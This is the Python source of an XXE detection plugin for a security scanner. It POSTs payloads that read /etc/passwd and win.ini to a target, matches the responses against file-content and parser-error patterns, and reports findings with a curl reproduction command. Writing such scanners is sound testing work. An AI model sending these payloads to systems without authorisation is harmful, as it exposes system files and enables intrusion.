# vibee_hacker/plugins/blackbox/xxe.py
"""XML External Entity (XXE) injection detection plugin."""

from __future__ import annotations

import shlex

import httpx

from vibee_hacker.core.models import Target, Result, Severity, InterPhaseContext
from vibee_hacker.core.plugin_base import PluginBase

XXE_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<root>&xxe;</root>'
)

XXE_PAYLOAD_WINDOWS = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
    '<root>&xxe;</root>'
)

PAYLOADS = [XXE_PAYLOAD, XXE_PAYLOAD_WINDOWS]

# Indicators that XXE was processed (file read succeeded or XML error leaks info)
DETECTION_PATTERNS = [
    "root:x:0:0:",          # Linux /etc/passwd content
    "daemon:x:",
    "nobody:x:",
    "[fonts]",              # Windows win.ini content
    "[extensions]",
    "for 16-bit app support",
    # XML parser error leakage patterns (context-specific to reduce FP)
    "DOCTYPE is not allowed",
    "ENTITY was referenced",
    "XML parser error",
    "XML declaration not well-formed",
    "not well-formed (invalid token)",
    "External entity",
]


class XxePlugin(PluginBase):
    name = "xxe"
    description = "XML External Entity (XXE) injection detection"
    category = "blackbox"
    phase = 3
    base_severity = Severity.CRITICAL
    detection_criteria = "Response contains /etc/passwd content after XXE payload POST"
    expected_evidence = "root:x:0:0: in HTTP response body"

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        headers = {"Content-Type": "application/xml"}

        async with httpx.AsyncClient(verify=target.verify_ssl, timeout=10) as client:
            for payload in PAYLOADS:
                try:
                    resp = await client.post(
                        target.url,
                        content=payload.encode(),
                        headers=headers,
                    )
                except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                    return []

                if len(resp.text) > 1_000_000:
                    continue

                for marker in DETECTION_PATTERNS:
                    if marker in resp.text:
                        curl_cmd = (
                            f"curl -X POST {shlex.quote(target.url)} "
                            f"-H 'Content-Type: application/xml' "
                            f"-d {shlex.quote(payload)}"
                        )
                        return [Result(
                            plugin_name=self.name,
                            base_severity=self.base_severity,
                            title="XML External Entity (XXE) Injection",
                            description=(
                                "The server processed an XXE payload and returned "
                                "file contents or XML error details in the response."
                            ),
                            evidence=f"Response contains: {marker!r}",
                            cwe_id="CWE-611",
                            endpoint=target.url,
                            curl_command=curl_cmd,
                            rule_id="xxe_entity_injection",
                        )]

        return []
